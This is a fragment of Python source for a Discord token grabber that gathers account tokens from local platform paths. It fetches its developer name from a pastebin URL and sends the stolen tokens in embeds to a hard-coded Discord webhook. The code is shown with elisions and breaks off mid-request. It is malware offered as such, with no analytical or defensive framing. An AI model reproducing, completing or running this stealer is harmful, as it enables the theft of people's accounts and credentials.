...
def getdeveloper():
    dev = "wodx"
    try:
        dev = urlopen(Request("https://pastebin.com/raw/XPhCN4UL")).read().decode()
    except:
        pass
    return dev
...
def main():
    ...
    for platform, path in PATHS.items():
        ...
        for token in gettokens(path):
            ...
            embed = {
                ...
                "footer": {
                    "text": f"Token grabber by {developer} with <3"
                }
            }
            embeds.append(embed)
    ...
    try:
        urlopen(Request(
            "https://discordapp.com/api/webhooks/756496126844207116/JNKaboBGfLiBt_eRlJMaGuCGcCWgre9tLJGKb2Ytdv_fbUkTmD3l0omOOnIV5tq3EkhC",
